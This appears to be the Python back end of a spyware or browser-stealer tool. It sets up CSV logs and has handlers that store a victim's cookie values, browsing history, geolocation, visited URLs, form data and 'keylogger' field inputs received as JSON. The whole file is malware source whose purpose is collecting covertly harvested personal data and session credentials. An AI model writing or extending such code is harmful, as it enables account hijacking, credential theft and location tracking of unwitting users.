import os
import pandas as pd
import json
import csv

a = __file__
a = a[:-6]+"logs\\"
print(a)
Geo_file = a + "geo.csv"
Cks_file = a + "cookies.csv"
His_file = a + "historial.csv"
url_file = a + "URL.csv"
FD_file  = a + "Form_Data.txt"
KLg_file = a + "keylogger_inputs.csv"
Files = [Geo_file,Cks_file,His_file,url_file,FD_file,KLg_file]
DFiles = {"Geo": 0, "Coo": 1, "His": 2, "Url": 3, "Form": 4, "Key": 5}

def main():

    for i in Files:

        f = open(i, "w")
        f.close()

    df = pd.DataFrame(columns=["domain","sameSite","secure","value"])
    df.to_csv(Cks_file, index=False)
    df = pd.DataFrame(columns=["lat","lon"])
    df.to_csv(Geo_file, index=False)
    df = pd.DataFrame(columns=["id","lastVisitTime","title","typedCount","url","visitCount"])
    df.to_csv(His_file, index=False)
    df = pd.DataFrame(columns=["url"])
    df.to_csv(url_file, index=False)
    df = pd.DataFrame(columns=["url","fieldname","fieldvalue"])
    df.to_csv(KLg_file, index=False)


def CookiesLog(raws):

    f = open(Cks_file, "r+")
    lines = f.readlines()
    if len(lines) > 600:
        lines.pop()
        f = open(Cks_file, "w+")
        f.writelines(lines)
    f.close()

    raws = json.loads(raws.decode("utf-8"))
    df = pd.read_csv(Cks_file)
    for raw in raws:
        data = []
        data.append(raw["domain"])
        data.append(raw["sameSite"])
        data.append(raw["secure"])
        data.append(raw["value"])
        data = pd.DataFrame([data], columns=["domain","sameSite","secure","value"])
        df = df.append(data, ignore_index=True)
    df.to_csv(Cks_file, index=False)

    


def HistLog(raws):
    raws = json.loads(raws.decode("utf-8"))
    df = pd.read_csv(His_file)
    for raw in raws:
        data = list(raw.values())
        data = pd.DataFrame([data], columns=["id","lastVisitTime","title","typedCount","url","visitCount"])
        df = df.append(data, ignore_index=True)
    
    df.to_csv(His_file, index=False)

def GeoLog(raw):
    raws = json.loads(raw.decode("utf-8"))
    df = pd.read_csv(Geo_file)
    data = []
    data.append(raws["lat"])
    data.append(raws["lon"])
    data = pd.DataFrame([data], columns=["lat","lon"])
    df = df.append(data, ignore_index=True)  
    df.to_csv(Geo_file, index=False)    
    pass

def UrlLog(raw):
    raw = json.loads(raw.decode("utf-8"))
    df = pd.read_csv(url_file)
    data = list(raw.values())
    data = pd.DataFrame([data], columns=["url"])
    df = df.append(data, ignore_index=True)  
    df.to_csv(url_file, index=False)    
    pass

def KeyLog(raw):
    raw = json.loads(raw.decode("utf-8"))
    df = pd.read_csv(KLg_file)
    data = list(raw.values())
    data = pd.DataFrame([data], columns=["url","fieldname","fieldvalue"])
    df = df.append(data, ignore_index=True)  
    df.to_csv(KLg_file, index=False)    
    pass

def log(file, data):
    file = DFiles[file]
    file = Files[file]
    if file == Cks_file:
        CookiesLog(data)
    if file == Geo_file:
        GeoLog(data)
    if file == His_file:
        HistLog(data)
    if file == url_file:
        UrlLog(data)
    if file == KLg_file:
        KeyLog(data)
    else:
        f = open(file, "a")
        f.write(data.decode("utf-8")+"\n")
        f.close
    pass